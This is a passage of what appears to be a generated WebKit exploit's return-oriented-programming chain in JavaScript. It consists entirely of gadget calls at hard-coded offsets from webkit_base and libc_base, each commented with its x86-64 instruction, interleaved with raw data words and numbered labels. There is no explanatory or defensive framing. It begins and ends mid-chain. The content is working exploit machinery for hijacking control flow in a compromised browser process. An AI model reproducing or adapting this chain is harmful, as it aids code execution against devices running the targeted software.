webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L769:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+7880191, //mov [rax], rcx
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
//L770:
webkit_base+18452836, //mov [rax + 0x18], rdi
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+95640, //L773-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L771:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L773:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+95744, //L776-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+95728, //L775-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L775:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L776:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+95888, //L779-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+95856, //L777-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+95872, //L778-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L777:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L778:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L779:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+95960, //L780-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L780:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+96016, //L783-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L783:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+96096, //L784-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L784:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L785:
db([11, 0]); // 0xb
set_gadget(libc_base+757614,); //pop rcx
//L786:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+96200, //L787-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+96216, //L788-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L787:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L788:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+96304, //L789-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L789:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+96360, //L792-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L792:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+96432, //L793-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L793:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+96488, //L796-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L796:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+7880191, //mov [rax], rcx
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
//L797:
libc_base+753198, //mov rax, rsi
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+96640, //L800-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L798:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L800:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+96744, //L803-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+96728, //L802-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L802:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L803:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+96888, //L806-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+96856, //L804-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+96872, //L805-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L804:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L805:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L806:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+96960, //L807-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L807:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+97016, //L810-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L810:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+97096, //L811-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L811:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L812:
db([12, 0]); // 0xc
set_gadget(libc_base+757614,); //pop rcx
//L813:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+97200, //L814-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+97216, //L815-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L814:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L815:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+97304, //L816-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L816:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+97360, //L819-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L819:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+97432, //L820-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L820:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+97488, //L823-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L823:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+7880191, //mov [rax], rcx
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
//L824:
libc_base+362222, //pop rsi
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+97640, //L827-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L825:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L827:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+97744, //L830-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+97728, //L829-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L829:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L830:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+97888, //L833-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+97856, //L831-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+97872, //L832-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L831:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L832:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L833:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+97960, //L834-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L834:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+98016, //L837-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L837:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+98096, //L838-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L838:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L839:
db([13, 0]); // 0xd
set_gadget(libc_base+757614,); //pop rcx
//L840:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+98200, //L841-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+98216, //L842-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L841:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L842:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+98304, //L843-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L843:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+98360, //L846-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L846:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+98432, //L847-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L847:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+98488, //L850-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L850:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+7880191, //mov [rax], rcx
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+98592, //L853-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L851:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+757614,); //pop rcx
//L853:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+98696, //L856-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+98680, //L855-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L855:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L856:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+98840, //L859-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+98808, //L857-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+98824, //L858-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L857:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L858:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L859:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+98912, //L860-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L860:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+98968, //L863-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L863:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+99048, //L864-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L864:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L865:
db([7, 0]); // 0x7
set_gadget(libc_base+757614,); //pop rcx
//L866:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+99152, //L867-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+99168, //L868-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L867:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L868:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+845415, //sub rax, rcx ; sbb rdx, rcx
libc_base+362222, //pop rsi
ropchain+99256, //L869-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L869:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+99312, //L872-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L872:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+99432, //L875-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L873:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L875:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+99536, //L878-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+99520, //L877-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L877:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L878:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+99680, //L881-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+99648, //L879-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+99664, //L880-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L879:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L880:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L881:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+99752, //L882-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L882:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+99808, //L885-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L885:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+99888, //L886-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L886:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L887:
db([14, 0]); // 0xe
set_gadget(libc_base+757614,); //pop rcx
//L888:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+99992, //L889-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+100008, //L890-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L889:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L890:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+100096, //L891-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L891:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+100152, //L894-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L894:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+100224, //L895-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L895:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+100280, //L898-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L898:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+7880191, //mov [rax], rcx
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
//L899:
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+100432, //L902-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L900:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L902:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+100536, //L905-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+100520, //L904-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L904:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L905:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+100680, //L908-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+100648, //L906-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+100664, //L907-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L906:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L907:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L908:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+100752, //L909-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L909:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+100808, //L912-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L912:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+100888, //L913-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L913:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L914:
db([15, 0]); // 0xf
set_gadget(libc_base+757614,); //pop rcx
//L915:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+100992, //L916-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+101008, //L917-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L916:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L917:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+101096, //L918-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L918:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+101152, //L921-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L921:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+101224, //L922-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L922:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+101280, //L925-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L925:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+7880191, //mov [rax], rcx
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
//L926:
libc_base+426261, //mov rax, rdx
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+101432, //L929-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L927:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L929:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
